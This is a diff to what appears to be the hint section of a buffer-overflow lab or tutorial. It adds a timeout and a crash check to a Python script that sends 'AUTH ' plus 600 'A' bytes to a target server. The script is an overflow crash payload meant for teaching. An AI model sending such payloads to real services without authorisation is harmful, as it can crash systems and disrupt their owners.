@@ -43,9 +43,16 @@ If you are stuck or aren't familiar with Python socket programming, use these hi
 > payload = b"AUTH " + b"A" * 600
 > 
 > s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+> s.settimeout(2)
 > s.connect((target_ip, target_port))
 > s.recv(1024)
 > s.send(payload)
+> 
+> # Try to receive the response. If it's empty, the server crashed!
+> response = s.recv(1024)
+> if not response:
+>     print("The server crashed!")
+> 
 > s.close()
 > ```
 
